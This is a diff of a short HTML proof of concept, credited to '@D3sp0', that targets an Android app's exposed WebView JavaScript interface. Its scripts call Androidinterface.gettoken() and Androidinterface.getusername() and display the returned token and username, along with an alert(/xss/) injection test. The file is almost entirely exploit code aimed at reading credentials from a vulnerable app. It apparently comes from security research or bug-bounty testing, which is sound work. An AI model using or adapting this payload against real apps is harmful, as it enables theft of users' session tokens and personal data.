@@ -1,14 +1,24 @@
-<script type="text/javascript">
-document.write("token: " + Androidinterface.gettoken());
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>javascriptinteface poc</title>
+</head>
+<body>
+	<h2>JavaScriptInterface poc by @D3sp0</h2>
+	
+</body>
+	<script>
+		javascript:alert(/xss/);
+	</script>
+	
+	<script>
+		javascript:alert(Androidinterface.getusername());
+	</script>
+	
+	<script type="text/javascript">
+		document.write("token: " + Androidinterface.gettoken());
+	</script>
 
-<!-- another one -->
-<script>
-  javascript:alert(Androidinterface.getusername())
-</script>
-
-
-<!-- test host -->
-<script>
-	javascript:alert(/xss/);
-</script>
+</html>
